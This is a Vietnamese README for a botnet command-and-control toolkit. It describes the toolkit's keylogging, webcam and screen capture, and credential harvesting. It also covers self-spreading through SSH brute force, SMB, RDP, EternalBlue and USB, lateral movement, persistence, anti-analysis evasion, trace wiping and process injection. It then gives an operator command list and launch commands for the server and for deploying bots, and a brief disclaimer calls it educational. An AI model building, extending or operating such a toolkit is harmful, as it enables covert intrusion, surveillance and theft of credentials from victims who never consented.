# Giới thiệu về Combined C&C Server

## I. Chức năng Quản lý Bot

### 1. Quản lý Kết nối
- Quản lý nhiều bot đồng thời qua SSH
- Tự động phục hồi kết nối khi mất
- Mã hóa toàn bộ giao tiếp
- Nhóm và phân loại bot

### 2. Điều Khiển Từ Xa
- Thực thi lệnh shell
- Chạy script Python
- Upload/Download file
- Điều khiển tiến trình
- Shutdown/Restart hệ thống

### 3. Thu thập Thông tin
- Keylogger nâng cao
- Chụp ảnh màn hình
- Quay phim/chụp ảnh webcam
- Thu thập thông tin hệ thống
- Theo dõi hoạt động mạng
- Thu thập thông tin đăng nhập

## II. Chức năng Lây lan

### 1. Quét Mạng
- Quét và phát hiện mục tiêu tự động
- Phân tích lỗ hổng
- Map topology mạng
- Phát hiện dịch vụ đang chạy

### 2. Phương thức Lây lan
- Lây lan qua SSH (bruteforce)
- Lây lan qua SMB
- Lây lan qua RDP
- Khai thác EternalBlue
- Lây lan qua USB
- Port knocking để ẩn dịch vụ

### 3. Di chuyển trong Mạng
- Lateral movement giữa các máy
- Thu thập và sử dụng credential
- Nhiều phương thức di chuyển (WMI, PsExec, WinRM)
- Tự động tìm đường đi tối ưu

## III. Chức năng Bảo mật

### 1. Persistence
- Nhiều phương thức duy trì (Registry, Task Scheduler, WMI)
- Tự động khôi phục khi bị xóa
- Phân tán các thành phần
- Cơ chế backup lẫn nhau giữa các bot

### 2. Chống Phát hiện
- Phát hiện môi trường ảo hóa
- Chống debug và phân tích
- Xóa dấu vết hoạt động
- Ẩn các process
- Mã hóa dữ liệu nhạy cảm

### 3. Bảo vệ Kết nối
- Mã hóa SSL/TLS
- Xác thực nhiều lớp
- Rotate các cổng kết nối
- Failover giữa các server

## IV. Chức năng Nâng cao

### 1. Tự động hóa
- Lập lịch các tác vụ
- Tự động thu thập thông tin
- Tự động lây lan
- Tự phục hồi khi gặp sự cố

### 2. Di chuyển Process
- Di chuyển giữa các process
- Process hollowing
- DLL injection
- Shellcode execution

### 3. Network Discovery
- Phát hiện cấu trúc mạng
- Phân tích các thiết bị
- Tìm đường đi tối ưu
- Theo dõi thay đổi topology

## V. Giao diện Điều khiển

### 1. Console UI
- Giao diện dòng lệnh tương tác
- Điều khiển trực tiếp các bot
- Quản lý tác vụ và lập lịch
- Theo dõi trạng thái real-time

### 2. Các Lệnh Chính
```bash
# Quản lý Bot
list                    # Hiển thị danh sách bot
select <id>            # Chọn bot để điều khiển
group <name> <ids>     # Nhóm các bot

# Điều khiển
shell <cmd>            # Thực thi lệnh shell
upload <src> <dst>     # Upload file
download <src> <dst>   # Download file
screenshot             # Chụp màn hình
webcam capture         # Chụp ảnh webcam
keylogger start/stop   # Điều khiển keylogger

# Thu thập Thông tin
sysinfo               # Thông tin hệ thống
ps                    # Liệt kê tiến trình
netstat              # Thông tin kết nối mạng
creds harvest        # Thu thập credential

# Lây lan
scan <subnet>         # Quét mạng
spread <target>       # Lây lan tới mục tiêu
lateral move <target> # Di chuyển tới máy khác

# Quản lý
schedule <task>       # Lập lịch tác vụ
persist install       # Cài đặt persistence
cleanup              # Xóa dấu vết
```

### 3. Tính năng Giám sát
- Theo dõi trạng thái bot
- Giám sát tài nguyên hệ thống
- Cảnh báo sự kiện bất thường
- Báo cáo hoạt động

## VI. Cách Sử dụng

### 1. Khởi động Server
```bash
python server.py
```

### 2. Triển khai Bot
```bash
python client.py <server_ip> <port>
```

### 3. Điều khiển qua Console
- Sử dụng các lệnh được liệt kê ở trên
- Có thể điều khiển từng bot hoặc nhóm bot
- Lập lịch các tác vụ tự động
- Theo dõi kết quả real-time

## VII. Bảo mật & Lưu ý

1. Hệ thống được thiết kế cho mục đích học tập và nghiên cứu
2. Chỉ sử dụng trên hệ thống được cấp phép
3. Tuân thủ các quy định về bảo mật
4. Không sử dụng cho mục đích độc hại